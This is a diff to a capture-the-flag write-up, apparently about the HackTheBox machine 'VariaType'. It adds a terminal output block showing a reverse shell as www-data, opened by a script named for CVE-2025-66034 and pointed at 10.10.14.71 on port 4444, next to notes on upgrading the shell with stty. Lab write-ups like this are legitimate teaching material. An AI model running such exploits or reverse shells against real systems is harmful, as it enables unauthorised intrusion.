@@ -1448,6 +1448,16 @@ zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --
 - **`stty raw`**: Tells your local terminal to pass all keyboard input (including `Ctrl+C` and `Tab`) directly to the remote shell without processing it locally.
 - **`-echo`**: Disables local echoing so you don't see double characters.
 - **`fg`**: Brings the backgrounded reverse shell back to the foreground.
+
+**Result:**
+
+```shell
+www-data@variatype:~/portal.variatype.htb/public/files$ ^Z
+zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
+
+┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
+└─$ 
+```
 <div align="center">
 <br>
 <br>
